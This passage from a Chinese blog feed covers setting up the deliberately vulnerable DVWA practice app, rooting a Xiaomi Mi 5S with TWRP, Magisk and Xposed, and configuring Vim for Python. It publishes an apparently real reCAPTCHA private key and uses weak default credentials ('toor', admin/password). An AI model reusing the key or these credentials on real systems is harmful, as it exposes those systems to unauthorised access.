CAPTCHA&#39; module#   You&#39;ll need to generate your own keys at: https://www.google.com/recaptcha/admin$_DVWA[ &#39;recaptcha_public_key&#39; ]  = &#39;&#39;;$_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;&#39;;</code></pre><p>按照提示，打开以上那个链接……</p><ul><li><a href="https://www.google.com/recaptcha/admin">https://www.google.com/recaptcha/admin</a></li></ul><p><strong>Label</strong> 栏里就填上 <strong><em>DVWA</em></strong> ，然后勾选 <em>reCAPTCHA v3</em> 以及 <em>Accept</em> ，最后点击 <em>Register</em> 。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv71o9oj30ez0modg5.jpg" <img src="/"></p><p>将秘钥复制到配置文件中的相应位置，</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv71mojj30qt0lzwf5.jpg" <img src="/"></p><pre><code class="bash">$_DVWA[ &#39;recaptcha_public_key&#39; ]  = &#39;6LfKd4kUAAAAAEk6g_eoecny__1zZwdknXuE2Lju&#39;;$_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;6LfKd4kUAAAAAECiwIiv5nrmh_k75TsKabJt0f3W&#39;;</code></pre><p>保存退出，刷新页面就会看到生效。</p><h3 id="目录可写权"><a href="#目录可写权" class="headerlink" title="目录可写权"></a>目录可写权</h3><p>将上面三个目录修改可写权限</p><pre><code class="bash">$ sudo chgrp www-data /var/www/html/dvwa/hackable/uploads/$ sudo chgrp www-data /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt$ sudo chgrp www-data /var/www/html/dvwa/config/</code></pre><h3 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h3><p>最后，还有一个小问题就是关于数据库的密码，还是打开那个配置文件</p><pre><code class="bash">$ sudo vi dvwa/config/config.inc.php</code></pre><p>找到以下字段</p><pre><code class="bash">$_DVWA = array();$_DVWA[ &#39;db_server&#39; ]   = &#39;127.0.0.1&#39;;$_DVWA[ &#39;db_database&#39; ] = &#39;dvwa&#39;;$_DVWA[ &#39;db_user&#39; ]     = &#39;root&#39;;$_DVWA[ &#39;db_password&#39; ] = &#39;p@aap0rd&#39;;</code></pre><p>重点是最后这一项，将引号中的密码设置为之前设置的 <strong><em>MySQL</em></strong> 数据库密码</p><pre><code class="bash">$_DVWA[ &#39;db_password&#39; ] = &#39;toor&#39;;</code></pre><p>而不是设置为空密码，若设置为空密码，点击 <code>Create/Reset Database</code> 就会出现**<em>不能连接 MySQL 服务**</em> 。</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv70oqfj30ij068gli.jpg" <img src="/"></p><p>设置正确后再次点击 <code>Create/Reset Database</code> </p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv738f1j30if0baweg.jpg" <img src="/"></p><p>点击登录，默认用户名 <em>admin</em> 密码 <em>password</em></p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv73s7xj30fa09imx2.jpg" <img src="/"></p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fz5zv76466j30p40m1dhf.jpg" <img src="/"></p><p>完成！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Root及后操作</title>
      <link href="2019/01/03/mi5s-magisk/"/>
      <url>2019/01/03/mi5s-magisk/</url>
      
        <content type="html"><![CDATA[<blockquote><p>其次，高可玩性得益于 Android 的开源。此文章仅算入坑，适合爱折腾的小白朋友；Android 机拿到最高权限的思路都类似，同是安卓机，即可借鉴。</p><p>高可玩性，是有了 <em>root</em> 管理权后的自由，所以便有了此文。</p></blockquote><span id="more"></span><h5 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h5><ul><li>代号 <em>capricorn</em> 的 Mi 5S</li><li>MIUI 10</li><li>Android 7.0</li></ul><h5 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h5><ul><li><em>Windows</em> 系统（最好不要使用虚拟机）</li><li><em>USB</em> 数据线</li><li>需登录小米账号</li><li>电量得足，最好<em>100%</em></li><li>手机上开启 <em>USB</em> 调试</li></ul><p>关于如何开开启 <em>USB</em> 调试，打开【设置】&gt;&gt;&gt;【我的设备】&gt;&gt;&gt;【全部参数】&gt;&gt;&gt;【MIUI 版本】连续点击6下，回到【设置】首页，进入【更多设置】&gt;&gt;&gt;【开发者选项】，找到并点亮<code>USB调试</code>。</p><p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytsk5x9n1j30u01hctaa.jpg"  width="50%" height="40%" /> </p>## Bootloader解锁<p>小米手机解锁申请：</p><p><a href="http://www.miui.com/unlock/index.html">http://www.miui.com/unlock/index.html</a></p><p>申请成功后，将解锁工具下载并解压到本地，打开可以看到以下文件</p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytse7q9w1j30kg0f475t.jpg" <img src="/"></p><p>由于我不是Windows系统，所以窗口和图标有所不同，但文件名都相同；其中</p><ul><li><code>driver_install_64.exe</code> 一个为64位的<em>Windows</em>安装驱动的文件</li><li><code>MiUsbDriver.exe</code> 为安装<em>USB</em>驱动文件</li><li><code>miflash_unlock.exe</code> 即为解锁文件</li></ul><p>其他暂不用关心，将你的电脑与手机用数据线连接起来；</p><p>打开顺序，先把驱动安装完，然后打开解锁文件<code>miflash_unlock.exe</code>。</p><p>如图，首先打开工具登录查询：</p><blockquote><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsfun2t8j30fa08vaaf.jpg" <img src="/"></p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsg5oqq0j30fa0ahmx8.jpg" <img src="/"></p></blockquote><p>其次，进入<em>Fastboot</em>模式，开始解锁</p><blockquote><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsgly5rsj30fa0aiweo.jpg" <img src="/"></p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fytsh34r48j30fa0ahq35.jpg" <img src="/"></p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytsjnf0aaj30u01hcadf.jpg"  width="50%" height="40%" /> </p>关于*Android*机，能把*Bootloader*锁了的，基本上都可以拿到*root*管理权。所以这一步成功了，后面的基本都不用担心了，问题都不大。<h2 id="刷入TWRP"><a href="#刷入TWRP" class="headerlink" title="刷入TWRP"></a>刷入TWRP</h2><blockquote><p>关于<em>TWRY</em>，它是一个替换系统自带<em>Recovery</em>模式的工具，由于系统自带的<em>Recovery</em>模式功能太简陋。</p><p>这里暂且不较真将它简单地认为为电脑的 <em>BIOS</em> 。</p></blockquote><p>官网：<a href="https://twrp.me/">https://twrp.me</a></p><p>下载（此链接仅适用于<em>capricorn</em>）：<a href="https://dl.twrp.me/capricorn/">https://dl.twrp.me/capricorn/</a></p><p>先将其最新版本下载到本地计算机，它的名称就像<code>twrp-x.x.x-x-capricorn.img</code>。建议将其放入之前那个小米解锁工具的文件夹中。</p><h4 id="进入-FASTBOOT"><a href="#进入-FASTBOOT" class="headerlink" title="进入 FASTBOOT"></a>进入 FASTBOOT</h4><p>然后，打开你的Windows中的CMD，切换当前路径为那个解锁工具的目录，然后使用以下命令将其重启到**<em>FASTBOOT**</em>模式。</p><pre><code class="bash">adb reboot bootloader </code></pre><blockquote><p>如果不懂上面这种方法，你还可以通过组合键到 <strong><em>FASTBOOT</em></strong> 模式；</p><p>重启设备，在进入开机的开始，按住<code>Volume Down</code>+<code>Power</code>，直至屏幕上出现 <strong><em>FASTBOOT</em></strong>。</p></blockquote><p>成功进入后，你还可以通过以下命令验证电脑是否找到手机</p><pre><code class="bash">fastboot devices</code></pre><h4 id="刷入-TWRY"><a href="#刷入-TWRY" class="headerlink" title="刷入 TWRY"></a>刷入 TWRY</h4><pre><code class="bash">fastboot flash recovery twrp-x.x.x-x-capricorn.img</code></pre><p>注意命名</p><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>同时按住 <code>音量上键</code> ＋ <code>电源键</code> ，没有进入 <em>TWRY</em> 的 <em>Recovery</em> 模式界面绝不要松手，直到进入 <em>TWRY</em> 的 <em>recovery</em> 界面为止。如下图，即为成功：</p><p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytshrz14rj31ys2y9hcy.jpg"  width="50%" height="50%" /> </p>## 安装Magisk<blockquote><p>关于Magisk，其强大的功能，使得我们普通玩家足以与厂商进行博弈。还是开源的，很给力。</p></blockquote><p>Magisk仓库：<a href="https://github.com/topjohnwu/Magisk">https://github.com/topjohnwu/Magisk</a></p><h5 id="其功能："><a href="#其功能：" class="headerlink" title="其功能："></a>其功能：</h5><ul><li>集成 root</li><li>SafetyNet</li><li>root 和 Magisk 的日志功能</li><li>Magisk Hide（隐藏 Magisk 的 root 权限）</li><li>systemless hosts（广告屏蔽）</li><li>Magisk 模块（例如，Xposed）</li></ul><p>Magisk工具包下载：<a href="https://pan.baidu.com/s/1ixJnljXY1mIgUWjk5FkYBQ">https://pan.baidu.com/s/1ixJnljXY1mIgUWjk5FkYBQ</a> 提取码: d8fy</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>下载上面的工具包，将其中的<code>Magisk-v18.0.zip</code>复制到手机的 <em>/sdcard</em> 目录下，然后重启到Recovery模式下，安装这个<code>zip</code>包，找到这个包，然后滑动滑块，开始刷入……</p><p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytskujgeyj30u01hcjrs.jpg"  width="50%" height="40%" /> </p><p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytsl3fdlsj30u01hc0tk.jpg"  width="50%" height="40%" /> </p><p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytsl907vjj30u01hcdgw.jpg"  width="50%" height="40%" /> </p> 完成后重启，在桌面上可以找到`Magisk Manager`，这个是`Magisk`的管理工具。<p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytslit8z1j30u01hcwpe.jpg"  width="50%" height="40%" /> </p><p style="text-align: center;"> <img src="/" class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/mw690/006V665tgy1fytslr8iehj30u01hc74z.jpg"  width="50%" height="40%" /> </p>至此，你就拿到了设备的root管理权<h2 id="Xposed-框架"><a href="#Xposed-框架" class="headerlink" title="Xposed 框架"></a>Xposed 框架</h2><blockquote><p><strong>Xposed框架</strong>（Xposed framework）可以在不修改APK文件的情况下修改程序的运行（修改系统），基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作。</p><p>——Wikipedia</p></blockquote><p>简单来讲，Android 手机弄上了这个框架才能成为真正的神机；手机上的一切骚操作都离不开这个 <code>Xposed</code> 框架。</p><p>在这个框架下，可以加载很多插件，来直接或间接操控系统及第三方 App 软件（术语叫hook）</p><p>可以仅在手机上就能实现一些非常厉害的操作，例如：</p><ul><li>秒抢红包</li><li>阻止消息撤回</li><li>个性化、优化各类App</li><li>等等</li></ul><p>当然不止这些功能……</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><blockquote><p>由于Xposed的官方版本最新的版本停留在Android 8.0/8.1 beta3版本（即v90-beta3），因此新机高于此Android版本的：</p><ul><li>Android Q (10)[sdk29]</li><li>Android Pie (9)[sdk28]</li><li>Android Oreo (8.x)[sdk26/27]</li></ul><p>我建议安装 EdXposed 框架。 </p><p>本质和实现功能是一样的。</p></blockquote><p>首先先在前面已经安装 Magisk 的基础上，</p><ol><li>先安装 <a href="https://github.com/RikkaApps/Riru"><code>Riru-Core</code></a> 模块；</li><li>然后再安装 <a href="https://github.com/ElderDrivers/EdXposed/releases">EdXposed (YAHFA)</a>；</li><li>最后安装 <a href="https://github.com/ElderDrivers/EdXposedManager">EdXposed Manager</a>；</li><li>重启设备就OK了。</li></ol><h3 id="推荐模块"><a href="#推荐模块" class="headerlink" title="推荐模块"></a>推荐模块</h3><ul><li>微X模块</li><li>QNotified</li><li>YouTube去广告</li><li>绿色守护</li></ul><h3 id="⚠️⚠️⚠️"><a href="#⚠️⚠️⚠️" class="headerlink" title="⚠️⚠️⚠️"></a>⚠️⚠️⚠️</h3><p>安装错误的 Xposed 模块，可能会导致手机开机无法进入系统或者坏掉，如果进不了系统可以进入 TWRP 关闭 Magisk ！（本人就碰到过）</p><p>所以一定一定要谨慎食用！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> root </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim 搭建 Python 开发环境入坑</title>
      <link href="2018/12/13/linux-vim-python/"/>
      <url>2018/12/13/linux-vim-python/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-先说一下我的环境"><a href="#0x00-先说一下我的环境" class="headerlink" title="0x00 先说一下我的环境"></a>0x00 先说一下我的环境</h3><ul><li><p>OS : Ubuntu18.04</p></li><li><p>Python 3.6.7</p><pre><code class="bash">$ sudo apt install python3</code></pre></li><li><p>pip 18.1</p><pre><code class="bash">$ sudo apt install python3-pip</code></pre></li><li><p><a href="https://github.com/vim/vim">Vim</a> 8.0 +</p><pre><code class="bash">$ sudo apt install vim</code></pre></li></ul><h3 id="0x01-版本检查"><a href="#0x01-版本检查" class="headerlink" title="0x01 版本检查"></a>0x01 版本检查</h3><p>如果你的操作系统已经安装了 <em>vim</em> ，你需要先检查一下它的版本；尽可能的将你的 <em>vim</em> 升级到新版本（*vim 8.0+*），否则可能会影响后续操作，出现版本不兼容之类的问题。</p><pre><code class="bash">$ vim --version</code></pre><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy50msk0xlj30y40qwe81.jpg" <img src="/"></p><p>　　如上图所示，就算正常了。</p><h3 id="0x02-Vim-安装"><a href="#0x02-Vim-安装" class="headerlink" title="0x02 Vim 安装"></a>0x02 Vim 安装</h3><p>若安装的版本不对，那么先卸载它，然后重新安装</p><pre><code class="bash">$ sudo apt purge vim</code></pre><blockquote><p>注：使用 <em>purge</em> 可将其配置文件一并移除掉，比 <em>remove</em> 移除的更加干净。</p></blockquote><p>如果没有安装 <em>vim</em> ，那就这个样子</p><pre><code class="bash">$ sudo apt install vim</code></pre><h3 id="0x03-插件管理器"><a href="#0x03-插件管理器" class="headerlink" title="0x03 插件管理器"></a>0x03 插件管理器</h3><blockquote><p>即 <strong>Vundle</strong> ，是 <em>Vim bundle</em> 的缩写，一个广泛使用的插件管理器。</p></blockquote><p><strong>Github 仓库</strong>：<a href="https://github.com/VundleVim/Vundle.vim">https://github.com/VundleVim/Vundle.vim</a></p><p><img src="/" class="lazyload" data-src="https://camo.githubusercontent.com/bc559468e6623d18947ced1ef353f68f6116e45a/687474703a2f2f692e696d6775722e636f6d2f527565683743632e706e67"  alt="img"></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h5 id="先安装一个分布式版本控制系统"><a href="#先安装一个分布式版本控制系统" class="headerlink" title="先安装一个分布式版本控制系统"></a>先安装一个分布式版本控制系统</h5><pre><code class="bash">$ sudo apt install git</code></pre><h5 id="然后将其克隆到本地"><a href="#然后将其克隆到本地" class="headerlink" title="然后将其克隆到本地"></a>然后将其克隆到本地</h5><pre><code class="bash">$ git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</code></pre><p>请注意大小写，这条命令就是将 <strong>Vundle</strong> 克隆到本地的 <em>~/.vim/bundle/</em> 目录下</p><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>回到你的家目录，创建 <em>vim</em> 的配置文件 <em>.vimrc</em> ，然后编辑它</p><p>　　　　$ cd ~ &amp;&amp; touch .vimrc &amp;&amp; gedit .vimrc</p><p> 再然后，将下面这一段复制到配置文件 <em>.vimrc</em> 中，其中的 <em>“</em> 相当于一般的配置文件中的 <em>#</em> ，在一段中，*”* 后面的语句都算注释语句，不生效；第十一行空着的目的就是，如果以后你想再添加其他的插件，那么其语句都应在空着的这行之中。 </p><pre><code class="bash">set nocompatible              &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本filetype off                  &quot; 必须要添加set rtp+=~/.vim/bundle/Vundle.vim &quot; 设置包括vundle和初始化相关的runtime pathcall vundle#begin()&quot; 另一种选择, 指定一个vundle安装插件的路径&quot;call vundle#begin(&#39;~/some/path/here&#39;)&quot; 让vundle管理插件版本,必须Plugin &#39;gmarik/Vundle.vim&#39;&quot; 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin)&quot; 你的所有插件需要在下面这行之前call vundle#end()            &quot; 必须filetype plugin indent on    &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本</code></pre><h5 id="开始安装了"><a href="#开始安装了" class="headerlink" title="开始安装了"></a>开始安装了</h5><p>安装这里有点绕，其实就是在终端打开 <em>vim</em> ，在命令模式（也就是直接进去的状态）下输入下面这条命令回车，这里得提供一下动态图，看图。</p><pre><code class="bash">:PluginInstall</code></pre><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy52makn42g30sl0lggob.gif" <img src="/"></p><p>　　稍等，完成安装后右下角会出现 <strong>Done!</strong> 届时，再退出去。</p><h5 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h5><p>除了安装插件的命令，还有一些其他的命令。</p><blockquote><p>:PluginList                - 列出所有已配置的插件</p><p>:PluginInstall           - 安装插件,追加 <code>!</code> 用以更新</p><p>:PluginUpdate         - 更新插件</p><p> :PluginSearch foo  - 搜索 foo ; 追加 <code>!</code> 清除本地缓存</p><p>:PluginClean            - 清除未使用插件,需要确认; 追加 <code>!</code> 自动批准移除未使用插件</p></blockquote><h3 id="0x04-代码补全"><a href="#0x04-代码补全" class="headerlink" title="0x04 代码补全"></a>0x04 代码补全</h3><blockquote><p>强大的代码补全插件，即 <strong>YouCompleteMe</strong> 。</p></blockquote><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy54p611ppg30q90d0x6r.gif" <img src="/"></p><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><p>在安装 <em>YouCompleteMe</em> 前，需安装相关依赖</p><ul><li><p>Ubuntu 16.04及更高版本</p><pre><code class="bash">$ sudo apt install build-essential cmake python3-dev</code></pre></li></ul><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>将下面一行写入到配置文件 <em>.vimrc</em> 的相应位置（上面有说过），然后打开 <em>vim</em> 输入 <em>:PluginInstall</em> 回车进行安装。</p><pre><code class="bash">Plugin &#39;Valloric/YouCompleteMe&#39;</code></pre><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy52makn42g30sl0lggob.gif" <img src="/"></p><p>等着……</p><h4 id="配置相应语言支持"><a href="#配置相应语言支持" class="headerlink" title="配置相应语言支持"></a>配置相应语言支持</h4><h5 id="如需-C-语言家族支持-可选"><a href="#如需-C-语言家族支持-可选" class="headerlink" title="如需 Ｃ 语言家族支持(可选)"></a>如需 Ｃ 语言家族支持(可选)</h5><pre><code class="bash">$ ./install.py --clang-completer</code></pre><h5 id="如需-Java-可选"><a href="#如需-Java-可选" class="headerlink" title="如需 Java(可选)"></a>如需 Java(可选)</h5><pre><code class="bash">$ ./install.py --java-completer</code></pre><h5 id="如需所有语言"><a href="#如需所有语言" class="headerlink" title="如需所有语言"></a>如需所有语言</h5><pre><code class="bash">$ ./install.py --all</code></pre><h5 id="对于-Python３-还需配置"><a href="#对于-Python３-还需配置" class="headerlink" title="对于 Python３ 还需配置"></a>对于 <em>Python３</em> 还需配置</h5><pre><code class="bash">$ python3 install.py -all</code></pre><p>至此完毕，另外关于 <em>YouCompleteMe</em> 配置文件，我会在最后说……</p><h3 id="0x05-文件树"><a href="#0x05-文件树" class="headerlink" title="0x05 文件树"></a>0x05 文件树</h3><blockquote><p><strong>NERDTree</strong> 是 <em>Vim</em> 编辑器的文件系统资源管理器。使用此插件，用户可以直观地浏览复杂的目录层次结构，快速打开文件以进行读取或编辑，以及执行基本的文件系统操作。</p></blockquote><p><strong>Github 仓库</strong>：<a href="https://github.com/scrooloose/nerdtree">https://github.com/scrooloose/nerdtree</a></p><p> class="lazyload" data-src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1fy55njeys4g312t0qnb29.gif" <img src="/"></p><h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><p>还是和上面安装 <em>YouCompleteMe</em> 插件一样，将下面一行添加到配置文件 <em>.vimrc</em> 中的 <em>Plugin ‘Valloric/YouCompleteMe’</em> 的下一行，然后打开 <em>vim</em> 输入 <em>:PluginInstall</em> 回车进行安装。</p><pre><code class="bash">Plugin &#39;scrooloose/nerdtree&#39;</code></pre><p>关于它的配置，最后再说……</p><h3 id="0x06-代码诊断"><a href="#0x06-代码诊断" class="headerlink" title="0x06 代码诊断"></a>0x06 代码诊断</h3><blockquote><p>ALE（异步Lint引擎）是一个插件，用于在编辑文本文件时在NeoVim 0.2.0+和Vim 8中提供linting，并充当Vim <a href="https://langserver.org/">语言服务器协议</a>客户端。</p></blockquote><p><strong>Github 仓库</strong>：<a href="https://github.com/w0rp/ale">https://github.com/w0rp/ale</a></p><p>ALE充当“语言客户端”以支持各种语言服务器协议功能，包括：</p><ul><li>诊断（通过语言服务器协议连接）</li><li>转到定义（<code>:ALEGoToDefinition</code>）</li><li>完成（<code>let g:ale_completion_enabled = 1</code>加载ALE之前）</li><li>寻找参考（<code>:ALEFindReferences</code>）</li><li>悬停信息（<code>:ALEHover</code>）</li><li>符号搜索（<code>:ALESymbolSearch</code>）</li></ul><p> class="lazyload" data-src="https://https//user-images.githubusercontent.com/3518142/59195938-3a81b100-8b85-11e9-8e8d-6a601b1db908.gif" <img src="/"></p><h4 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h4><p>在这里我使用 <em>git</em> ，将其克隆到本地 <code>~/.vim/bundle/</code> 下。</p><pre><code class="bash">$ cd  ~ / .vim/bundle &amp;&amp; git clone https://github.com/w0rp/ale.git</code></pre><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><strong>pylint</strong> 这是一个 <em>Python</em> 静态代码分析工具，它将配合 <strong>ALE</strong> 一起使用，可以查找编程错误，帮助强制执行编码标准，嗅探代码异味并提供简单的重构建议。</p><ul><li><p><strong>Github 仓库</strong>：<a href="https://github.com/PyCQA/pylint">https://github.com/PyCQA/pylint</a></p></li><li><p><strong>官网</strong>：<a href="http://pylint.pycqa.org/en/latest/">http://pylint.pycqa.org/en/latest/</a></p></li><li><p><strong>pip安装</strong></p><ul><li>由于 <em>pip</em> 安装东西权限不好解决，故应先切换到 <em>root</em> 用户再进行安装</li></ul><pre><code class="bash">$ sudo -i ……# pip install pylint --upgrade</code></pre></li></ul><h3 id="0x07-关于-Vim-的配置"><a href="#0x07-关于-Vim-的配置" class="headerlink" title="0x07 关于 Vim 的配置"></a>0x07 关于 Vim 的配置</h3><blockquote><p>在上面安装了几个插件，我们就可以按照自己的需求来配置实现相应功能。即对 <code>.vimrc</code> ，此文件进行配置。</p></blockquote><h4 id="我的-vimrc"><a href="#我的-vimrc" class="headerlink" title="我的 .vimrc"></a>我的 <code>.vimrc</code></h4><p>其实，我的这份配置文件也是在网上找的，做了个整合，还对一些语句做了注释（不然都看不懂）。</p><pre><code class="bash">&quot;vundle配置&quot; set the runtime path to include Vundle and initializeset rtp+=~/.vim/bundle/Vundle.vim      &quot; 设置包括vundle和初始化相关的runtime pathcall vundle#begin()&quot;call vundle#begin(&#39;~/some/path/here&#39;) &quot; 另一种选择, 指定一个vundle安装插件的路径&quot; 让vundle管理插件版本,必须Plugin &#39;gmarik/Vundle.vim&#39;Plugin &#39;Valloric/YouCompleteMe&#39;let g:ycm_key_invoke_completion = &#39;&lt;c-z&gt;&#39; &quot; 提示快捷键Plugin &#39;scrooloose/nerdtree&#39;&quot; 添加你的所有插件在这儿 (注意Vundle的旧版本使用Bundle而不是Plugin)Plugin &#39;jistr/vim-nerdtree-tabs&#39;autocmd VimEnter * NERDTreeBundle &#39;davidhalter/jedi-vim&#39;let g:SimpyIFold_docstring_preview=1 &quot; 完成补全后自动消失预览窗口let g:ycm_server_python_interpreter=&#39;/usr/bin/python3&#39; &quot; 蟒蛇解释器位置let g:ycm_global_ycm_extra_conf=&#39;~/.vim/.ycm_extra_conf.py&#39;let g:ycm_autoclose_preview_window_after_completion=1 &quot; 完成操作后自动补全窗口不消失set completeopt=preview &quot; 补全内容不以分割子窗口形式出现，只显示补全列表let NERDTreeIgnore=[&#39;\.pyc$&#39;, &#39;\~$&#39;] &quot;ignore files in NERDTree&quot;显示相关&quot;set shortmess=atI  &quot;不显示帮助乌干达的提示colorscheme desert &quot;设置配色方案set showcmd &quot;输入的命令显示出来syntax on &quot;语法高亮set tabstop=4  &quot;Tab键的宽度设为４set softtabstop=4set shiftwidth=4  &quot;统一缩进为４set autoindent  &quot;开启自动缩进，保持缩进值与上一行相等autocmd InsertLeave * se nocul &quot;用浅色高亮当前行autocmd InsertEnter * se cul &quot;用浅色高亮当前行set ruler &quot;显示当前光标行列位置set mouse=a &quot;支持鼠标set laststatus=2 &quot;显示状态栏（默认值为１，无法显示状态栏)if has(&#39;gui_running&#39;)    set t_Co=256endifset guifont=Monoset autoread &quot;当文件在外部修改时，vim自动更新载入set ignorecase &quot;搜索时忽略大小写set foldmethod=syntaxset nofoldenable &quot;此两行为折叠代码&quot;自定义键映射&quot;实现CTRL-w保存操作nnoremap &lt;C-w&gt; :w&lt;cr&gt;imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt;&quot;映射以F12打开NERDTreennoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt;&quot;映射自动补全括号inoremap ( ()&lt;ESC&gt;iinoremap [ []&lt;ESC&gt;iinoremap &#123; &#123;&#125;&lt;ESC&gt;iinoremap &quot; &quot;&quot;&lt;ESC&gt;iinoremap &#39; &#39;&#39;&lt;ESC&gt;iset encoding=utf-8set fenc=utf-8set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5set enc=utf-8let &amp;termencoding=&amp;encodingset nu                        &quot; 显示行数set nocompatible              &quot; 必须，加载vim自带和插件相应的语法和文件类型相关脚本filetype off                  &quot; 必须set list listchars=tab:&gt;-,trail:-,eol:$  &quot;设定tab键显示为&gt;-,每行行尾显示$set report=0&quot;python运行配置map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt;  &quot;按F10键进行python调试au BufNewFile,BufRead *.py &quot;设置py文件支持PEP8风格\ set tabstop=4r\ set softtabstop=4\ set shiftwidth=4\ set textwidth=79\ set expandtab\ set autoindent\ set fileformat=unix&quot;auto add pyhton header --start 自动添加py文件头 autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader  autocmd BufNewFile *.py ks|call FileName()|&#39;s  autocmd BufNewFile *.py ks|call CreatedTime()|&#39;s  fun FileName()      if line(&quot;$&quot;) &gt; 10        let l = 10  &quot;这里是字母L    else        let l =line(&quot;$&quot;)    endif    exe &quot;1,&quot;.l.&quot;g/File Name:.*/s/File Name:.*/File Name:&quot;.expand(&quot;%&quot;)&quot;最前面是数字1，这里的File Name:和模板中一致endfunfun CreatedTime()    if line(&quot;$&quot;) &gt; 10        let l=10    else        let l=line(&quot;$&quot;)    endif    exe &quot;1,&quot;.l.&quot;g/Created Time:.*/s/Created Time:.*/Created Time:&quot;.strftime(&quot;%Y-%m-%d %T&quot;)&quot;这里Create Time:要和模板中一致endfun&quot;auto add python header --endPlugin &#39;w0rp/ale&#39;&quot; 对应语言需要安装相应的检查工具&quot; https://github.com/w0rp/ale    let g:ale_linters_explicit = 1 &quot;除g:ale_linters指定，其他不可用    let g:ale_linters = &#123;\    &#39;python&#39;: [&#39;pylint&#39;]\&#125;&quot;\   &#39;cpp&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;,&#39;gcc&#39;],&quot;\   &#39;c&#39;: [&#39;cppcheck&#39;,&#39;clang&#39;, &#39;gcc&#39;],&quot;\   &#39;bash&#39;: [&#39;shellcheck&#39;],&quot;\   &#39;go&#39;: [&#39;golint&#39;],let g:ale_sign_column_always = 1let g:ale_completion_delay = 500let g:ale_echo_delay = 20let g:ale_lint_delay = 500let g:ale_echo_msg_format = &#39;[%linter%] %code: %%s&#39;let g:ale_lint_on_text_changed = &#39;normal&#39;let g:ale_lint_on_insert_leave = 1let g:airline#extensions#ale#enabled = 1&quot;let g:ale_set_quickfix = 1&quot;let g:ale_open_list = 1&quot;打开quitfix对话框let g:ale_c_gcc_options = &#39;-Wall -O2 -std=c99&#39;let g:ale_cpp_gcc_options = &#39;-Wall -O2 -std=c++14&#39;let 